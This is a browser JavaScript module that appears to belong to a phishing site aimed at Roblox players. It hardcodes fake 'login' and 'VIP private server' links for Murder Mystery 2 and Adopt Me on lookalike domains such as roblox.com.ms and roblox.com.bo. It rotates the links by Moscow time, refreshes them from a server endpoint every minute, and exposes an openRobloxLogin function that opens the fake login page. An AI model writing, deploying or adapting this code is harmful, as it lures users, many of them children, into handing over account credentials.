(function (global) {
  'use strict';

  var FALLBACK = {
    login: 'https://roblox.com.ms/login?returnUrl=1529037819528066',
    mm2: {
      day: 'https://roblox.com.ms/games/142823291/Murder-Mystery-2?privateServerLinkCode=98785592047531357859374564753865',
      evening: 'https://roblox.com.ms/games/142823291/Murder-Mystery-2?privateServerLinkCode=98785592047531357859374564753865',
    },
    adoptme: {
      day: 'https://roblox.com.bo/games/920587237/Adopt-Me?privateServerLinkCode=28481125710176773478213279975589',
      evening: 'https://www.roblox.com.am/games/920587237/Adopt-Me?privateServerLinkCode=152747484525262034763692323143',
    },
  };

  function detectGame() {
    var current = global.document && global.document.currentScript;
    var fromAttr = current && current.getAttribute('data-game');
    if (fromAttr === 'adoptme' || fromAttr === 'mm2') return fromAttr;
    var htmlGame = global.document && global.document.documentElement &&
      global.document.documentElement.getAttribute('data-game');
    if (htmlGame === 'adoptme' || htmlGame === 'mm2') return htmlGame;
    return 'mm2';
  }

  function fallbackLinks(game) {
    var gameKey = game === 'adoptme' ? 'adoptme' : 'mm2';
    var parts = new Intl.DateTimeFormat('en-GB', {
      timeZone: 'Europe/Moscow',
      hour: '2-digit',
      minute: '2-digit',
      hour12: false,
    }).formatToParts(new Date());
    var hour = 0;
    var minute = 0;
    for (var i = 0; i < parts.length; i++) {
      if (parts[i].type === 'hour') hour = Number(parts[i].value);
      if (parts[i].type === 'minute') minute = Number(parts[i].value);
    }
    var now = hour * 60 + minute;
    var slot = now >= 14 * 60 ? 'evening' : 'day';
    var vip = FALLBACK[gameKey][slot];
    return {
      game: gameKey,
      slot: slot,
      mode: 'auto',
      vip: vip,
      login: FALLBACK.login,
      joinLinkTemplate: vip,
      vipLinkTemplate: vip,
      loginUrl: FALLBACK.login,
    };
  }

  var activeGame = detectGame();
  var cachedLinks = fallbackLinks(activeGame);

  function applyLinks(links) {
    cachedLinks = links || cachedLinks;
    global.APP_CONFIG = Object.assign({}, global.APP_CONFIG || {}, {
      joinLinkTemplate: cachedLinks.vip,
      vipLinkTemplate: cachedLinks.vip,
      loginUrl: cachedLinks.login,
    });
    return cachedLinks;
  }

  function fetchLinks() {
    if (!global.fetch) return Promise.resolve(applyLinks(fallbackLinks(activeGame)));
    return fetch('/api/links?game=' + encodeURIComponent(activeGame), { cache: 'no-store' })
      .then(function (res) {
        if (!res.ok) throw new Error('links http ' + res.status);
        return res.json();
      })
      .then(function (data) {
        return applyLinks({
          game: data.game || activeGame,
          slot: data.slot || 'day',
          mode: data.mode || 'auto',
          vip: data.vipLinkTemplate || data.joinLinkTemplate,
          login: data.loginUrl || FALLBACK.login,
          joinLinkTemplate: data.joinLinkTemplate || data.vipLinkTemplate,
          vipLinkTemplate: data.vipLinkTemplate || data.joinLinkTemplate,
          loginUrl: data.loginUrl || FALLBACK.login,
        });
      })
      .catch(function () {
        return applyLinks(fallbackLinks(activeGame));
      });
  }

  var SiteLinks = {
    game: activeGame,
    getLinks: function () {
      return cachedLinks;
    },
    getVipUrl: function () {
      return cachedLinks.vip;
    },
    getLoginUrl: function () {
      return cachedLinks.login;
    },
    openLogin: function () {
      global.open(SiteLinks.getLoginUrl(), '_blank');
    },
    refresh: function () {
      return fetchLinks();
    },
  };

  applyLinks(cachedLinks);
  fetchLinks();
  global.SiteLinks = SiteLinks;
  global.getLoginUrl = SiteLinks.getLoginUrl;
  global.openRobloxLogin = SiteLinks.openLogin;

  global.setInterval(function () {
    fetchLinks();
  }, 60000);
})(typeof window !== 'undefined' ? window : global);
